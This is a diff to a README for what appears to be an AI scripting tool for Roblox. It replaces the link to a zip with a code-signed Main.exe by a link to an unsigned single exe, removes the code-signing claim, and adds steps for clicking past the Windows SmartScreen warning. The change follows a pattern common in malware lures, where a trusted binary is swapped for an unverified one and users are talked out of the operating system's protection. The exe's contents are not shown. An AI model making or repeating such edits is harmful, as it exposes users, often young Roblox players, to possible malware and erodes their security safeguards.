@@ -57,12 +57,11 @@ Most AI tools for Roblox write a script, say "done" and leave the bugs to you. *
 
 | Download | For |
 |---|---|
-| [`roblox-ai-place-diff.zip`](https://github.com/DiplomatHearth/roblox-ai-place-diff/releases/latest/download/roblox-ai-place-diff.zip) | Windows 10 and 11, one file |
+| [`Diff-1.5.8-portable-x64.exe`](https://github.com/DiplomatHearth/roblox-ai-place-diff/releases/latest/download/Diff-1.5.8-portable-x64.exe) | Windows 10 and 11, one file |
 
-Unpack the whole folder and start `Main.exe`. No installer, no admin rights.
+Download and start the exe. No installer, no admin rights.
 
-`Main.exe` is code-signed, so Windows starts it without a warning. Keep
-`Diff` next to it: they ship together.
+The build is not code-signed yet, so SmartScreen may warn once: choose **More info**, then **Run anyway**.
 | `Baseplate.rbxm` | The Studio plugin, built with Rojo ([build it](#build-from-source)) |
 
 ## See every change first
